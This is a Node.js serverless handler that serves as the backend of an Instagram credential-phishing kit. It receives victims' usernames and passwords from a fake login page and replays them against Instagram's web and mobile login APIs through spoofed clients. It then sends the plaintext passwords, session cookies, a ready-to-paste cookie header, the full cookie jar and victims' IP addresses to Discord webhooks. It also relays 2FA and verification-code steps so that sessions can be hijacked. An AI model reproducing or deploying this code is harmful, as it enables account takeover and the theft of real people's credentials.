const https = require('node:https');
const http = require('node:http');
const zlib = require('node:zlib');
const crypto = require('node:crypto');
const { URL } = require('node:url');

const BASE = 'https://www.instagram.com';
const IAPI = 'https://i.instagram.com';
const APP_ID = '936619743392459';
const MOB_APP_ID = '567067343352427';
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const MOB_UA = 'Instagram 275.0.0.27.98 Android (33/13; 420dpi; 1080x2201; samsung; SM-G991B; o1s; exynos2100; en_US; 458229237)';
const PROXY = process.env.IG_PROXY || '';

function tunnel(proxyUrl, host, port) {
  return new Promise((resolve, reject) => {
    const p = new URL(proxyUrl);
    const lib = p.protocol === 'https:' ? https : http;
    const auth = p.username
      ? 'Basic ' + Buffer.from(decodeURIComponent(p.username) + ':' + decodeURIComponent(p.password)).toString('base64')
      : null;
    const req = lib.request({
      host: p.hostname,
      port: p.port || (p.protocol === 'https:' ? 443 : 80),
      method: 'CONNECT',
      path: host + ':' + port,
      headers: auth ? { 'proxy-authorization': auth } : {},
      rejectUnauthorized: false,
      timeout: 15000
    });
    req.on('connect', (r, s) => (r.statusCode === 200 ? resolve(s) : reject(new Error('proxy ' + r.statusCode))));
    req.on('error', reject);
    req.on('timeout', () => req.destroy(new Error('proxy timeout')));
    req.end();
  });
}

async function request(url, { method = 'GET', headers = {}, body } = {}) {
  const u = new URL(url);
  const socket = PROXY ? await tunnel(PROXY, u.hostname, 443) : null;
  return new Promise((resolve, reject) => {
    const o = { host: u.hostname, port: 443, path: u.pathname + u.search, method, headers, servername: u.hostname, timeout: 25000 };
    if (socket) { o.agent = false; o.createConnection = () => socket; }
    const req = https.request(o, (res) => {
      const e = res.headers['content-encoding'];
      let s = res;
      if (e === 'gzip') s = res.pipe(zlib.createGunzip());
      else if (e === 'deflate') s = res.pipe(zlib.createInflate());
      else if (e === 'br') s = res.pipe(zlib.createBrotliDecompress());
      const c = [];
      s.on('data', (x) => c.push(x));
      s.on('end', () => resolve({ status: res.statusCode, headers: res.headers, text: Buffer.concat(c).toString('utf8') }));
    });
    req.on('error', reject);
    req.on('timeout', () => req.destroy(new Error('timeout')));
    if (body) req.write(body);
    req.end();
  });
}

class Jar {
  constructor(o = {}) { this.c = o; }
  header() { return Object.entries(this.c).map(([k, v]) => `${k}=${v}`).join('; '); }
  get(n) { return this.c[n]; }
  absorb(h) {
    for (const line of [].concat(h['set-cookie'] || [])) {
      const p = line.split(';')[0], i = p.indexOf('=');
      if (i < 1) continue;
      const k = p.slice(0, i).trim(), v = p.slice(i + 1).trim();
      if (!v || /max-age=0|1970/i.test(line)) delete this.c[k];
      else this.c[k] = v;
    }
  }
}
const parse = (s) => { try { return new Jar(JSON.parse(Buffer.from(String(s || ''), 'base64url').toString())); } catch { return new Jar(); } };
const pack = (jar, u, ua, ch) => Buffer.from(JSON.stringify({ c: jar.c, u, a: ua, ch })).toString('base64url');
const json = (t) => { try { return JSON.parse(t); } catch { return {}; } };

function wh(jar, ua, ref) {
  const h = {
    'user-agent': ua, accept: '*/*', 'accept-language': 'en-US,en;q=0.9', 'accept-encoding': 'gzip, deflate, br',
    'x-ig-app-id': APP_ID, 'x-asbd-id': '129477', 'x-requested-with': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty',
    origin: BASE, referer: ref || BASE + '/accounts/login/'
  };
  if (jar) { h.cookie = jar.header(); const t = jar.get('csrftoken'); if (t) h['x-csrftoken'] = decodeURIComponent(t); }
  return h;
}

function mh(jar, csrf) {
  const h = {
    'user-agent': MOB_UA, 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br',
    'x-ig-app-id': MOB_APP_ID, 'x-ig-capabilities': '3brTvw==', 'x-ig-connection-type': 'WIFI',
    'x-ig-bandwidth-totalbytes-b': '0', 'x-ig-bandwidth-totaltime-ms': '0',
    'x-pigeon-session-id': crypto.randomUUID(), 'x-pigeon-raq': '1',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    origin: IAPI, referer: 'https://www.instagram.com/'
  };
  if (jar) { h.cookie = jar.header(); if (csrf) h['x-csrftoken'] = decodeURIComponent(csrf); }
  return h;
}

async function web(path, { jar, ua, method = 'GET', form, referer } = {}) {
  const h = wh(jar, ua, referer);
  let body;
  if (form) { h['content-type'] = 'application/x-www-form-urlencoded'; body = new URLSearchParams(form).toString(); }
  const r = await request(path.startsWith('http') ? path : BASE + path, { method, headers: h, body });
  if (jar) jar.absorb(r.headers);
  return r;
}

async function mob(path, { jar, csrf, form } = {}) {
  const r = await request(IAPI + path, { method: 'POST', headers: mh(jar, csrf), body: new URLSearchParams(form).toString() });
  if (jar) jar.absorb(r.headers);
  return r;
}

let key = null;
async function encPass(jar, ua, pw) {
  try {
    if (!key || key.exp < Date.now()) {
      const r = await web('/encryption/public', { jar, ua });
      const k = json(r.text);
      if (!k.public_key) return '';
      key = { k: k.public_key, v: k.version, exp: Date.now() + 36e5 };
    }
    const e = crypto.publicEncrypt({ key: key.k, padding: crypto.constants.RSA_PKCS1_PADDING }, Buffer.from(pw));
    return `#PWD_BROWSER:${key.v}:${Math.round(Date.now() / 1000)}:${e.toString('base64')}`;
  } catch { return ''; }
}

async function hook(payload) {
  const urls = (process.env.DISCORD_WEBHOOK_URL || '').split(',').map((s) => s.trim()).filter(Boolean);
  await Promise.all(urls.map((u) => fetch(u, {
    method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(payload)
  }).catch(() => {})));
}
const field = (n, v, i) => ({ name: n, value: String(v).slice(0, 1020), inline: !!i });
const dec = (v) => { try { return decodeURIComponent(v); } catch { return v; } };
const split = (s) => { const o = []; for (let i = 0; i < s.length && o.length < 5; i += 950) o.push(s.slice(i, i + 950)); return o; };

async function win(res, username, password, sid, ua, ip, jar) {
  const paste = [
    `sessionid=${sid}`,
    jar.get('ds_user_id') && `ds_user_id=${jar.get('ds_user_id')}`,
    jar.get('csrftoken') && `csrftoken=${jar.get('csrftoken')}`,
    jar.get('mid') && `mid=${jar.get('mid')}`,
    jar.get('ig_did') && `ig_did=${jar.get('ig_did')}`
  ].filter(Boolean).join('; ');

  const embeds = [{
    title: '✅ Instagram — password valid',
    color: 0xe1306c,
    timestamp: new Date().toISOString(),
    fields: [
      field('Username', username),
      field('Password', '```' + password + '```'),
      field('sessionid (decoded)', '```' + dec(sid) + '```'),
      field('Paste-ready cookie header', '```' + paste + '```'),
      field('User-Agent to reuse', '```' + ua + '```'),
      field('User ID', jar.get('ds_user_id') || 'n/a', true),
      field('IP', ip, true)
    ]
  }];
  split(Object.entries(jar.c).map(([k, v]) => `${k}=${v}`).join('; ')).forEach((c, i) =>
    embeds.push({ title: i ? 'Cookie jar (cont.)' : 'Full cookie jar', color: 0x222222, description: '```\n' + c + '\n```' })
  );
  await hook({ content: `**${username}**`, embeds });
  return res.json({ step: 'done' });
}

module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).json({ message: 'POST only' });
  try {
    const b = req.body || {};
    const ua = b.ua && b.ua.length > 30 ? b.ua : UA;
    const username = String(b.username || '').trim();
    const password = String(b.password || '');
    const ip = (req.headers['x-forwarded-for'] || '').split(',')[0] || '?';
    if (!username || !password) return res.json({ step: 'bad', message: 'Enter your username and password.' });

    const jar = parse(b.state);
    const seed = crypto.createHash('md5').update(username).digest('hex');
    const guid = crypto.randomUUID();

    let page = await web('/', { jar, ua, referer: BASE + '/' });
    if (!jar.get('csrftoken')) page = await web('/accounts/login/', { jar, ua, referer: BASE + '/' });
    if (!jar.get('csrftoken')) return res.json({ step: 'bad', message: 'Instagram is not responding. Try again.' });

    const dtsg = (page.text.match(/"fb_dtsg":"([^"]+)"/) || [])[1] || '';
    const enc = await encPass(jar, ua, password);
    const csrf = jar.get('csrftoken');

    const webForm = {
      username, enc_password: enc, _csrftoken: csrf, queryParams: '{}',
      optIntoOneTap: 'false', stopDeletionNonce: '', trustedDeviceRecords: '{}'
    };
    if (dtsg) {
      webForm.fb_dtsg = dtsg;
      webForm.jazoest = '2' + [...dtsg].reduce((a, c) => a + c.charCodeAt(0), 0);
    }
    if (!enc) { delete webForm.enc_password; webForm.password = password; }

    let r = await web('/api/v1/web/accounts/login/ajax/', { jar, ua, method: 'POST', form: webForm });
    let d = json(r.text);

    if (!d.authenticated && !d.two_factor_required && d.message !== 'challenge_required' && r.status >= 400) {
      await new Promise((x) => setTimeout(x, 900));
      r = await web('/api/v1/web/accounts/login/ajax/', { jar, ua, method: 'POST', form: webForm });
      d = json(r.text);
    }

    let sid = jar.get('sessionid');
    if (d.authenticated && sid) return win(res, username, password, sid, ua, ip, jar);

    if (!d.two_factor_required && d.message !== 'challenge_required') {
      const mf = {
        username, enc_password: enc, _csrftoken: csrf,
        guid, phone_id: crypto.randomUUID(), device_id: 'android-' + seed.slice(0, 16), adid: seed,
        login_attempt_count: '1', locale: 'en_US', waterfall_id: crypto.randomUUID(),
        country_codes: '[{"country_code":"1","source":["default"]}]'
      };
      if (!enc) { delete mf.enc_password; mf.password = password; }
      const mr = await mob('/api/v1/accounts/login/', { jar, csrf, form: mf });
      const md = json(mr.text);
      if (md.logged_in && jar.get('sessionid')) {
        if (md.user_id && !jar.get('ds_user_id')) jar.c.ds_user_id = String(md.user_id);
        return win(res, username, password, jar.get('sessionid'), ua, ip, jar);
      }
      if (md.two_factor_required) { d = md; d.__ch = 'mob'; }
      else if (md.message === 'challenge_required') { d = md; d.__ch = 'mob'; }
    }

    if (d.two_factor_required) {
      const info = d.two_factor_info || {};
      const ch = d.__ch || 'web';
      await hook({
        content: `**${username}**`,
        embeds: [{
          title: '🔐 Instagram — 2FA required', color: 0xe1306c, timestamp: new Date().toISOString(),
          fields: [field('Username', username), field('Password', '```' + password + '```'),
            field('Code sent to', info.obfuscated_phone_number || 'n/a', true), field('IP', ip, true)]
        }]
      });
      return res.json({
        step: '2fa', hint: info.obfuscated_phone_number || '',
        identifier: info.two_factor_identifier || '', state: pack(jar, username, ua, ch)
      });
    }

    const ch = d.challenge;
    if (d.message === 'challenge_required' && ch && ch.api_path) {
      const ch2 = d.__ch || 'web';
      let hint = '';
      const cp = ch2 === 'mob'
        ? '/api/v1/challenge/' + ch.api_path.replace(/^\/?challenge\//, '')
        : ch.api_path;
      try {
        const g = ch2 === 'mob'
          ? await request(IAPI + cp, { method: 'GET', headers: mh(jar, csrf) })
          : await web(cp, { jar, ua });
        const cj = json(g.text);
        hint = cj.step_data?.contact_point || cj.contact_point || '';
        const choices = cj.choices || cj.step_data?.choice || [];
        const pick = choices.includes('email') ? 'email' : choices.includes('sms') ? 'sms' : null;
        if (pick) {
          if (ch2 === 'mob') await mob(cp, { jar, csrf, form: { choice: pick, _csrftoken: csrf } });
          else await web(cp, { jar, ua, method: 'POST', form: { choice: pick, _csrftoken: csrf } });
        }
      } catch {}
      await hook({
        content: `**${username}**`,
        embeds: [{
          title: '📧 Instagram — verification code required', color: 0xe1306c, timestamp: new Date().toISOString(),
          fields: [field('Username', username), field('Password', '```' + password + '```'),
            field('Code sent to', hint || 'email or SMS', true), field('IP', ip, true)]
        }]
      });
      return res.json({ step: 'challenge', hint, enc, path: ch.api_path, state: pack(jar, username, ua, ch2) });
    }

    await hook({
      content: `**${username}**`,
      embeds: [{
        title: '❌ Instagram — rejected', color: 0x992d22, timestamp: new Date().toISOString(),
        fields: [field('Username', username), field('Password tried', '```' + password + '```'),
          field('Response', JSON.stringify(d).slice(0, 900))]
      }]
    });

    return res.json({
      step: 'bad',
      message: d.user === false || d.message === 'bad_password'
        ? 'Sorry, your password was incorrect. Please double-check your password.'
        : 'Something went wrong. Please try again.',
      state: pack(jar, username, ua, 'web')
    });
  } catch (e) {
    console.error(e);
    return res.json({ step: 'bad', message: 'Network error. Please try again.' });
  }
};

module.exports.config = { maxDuration: 60 };
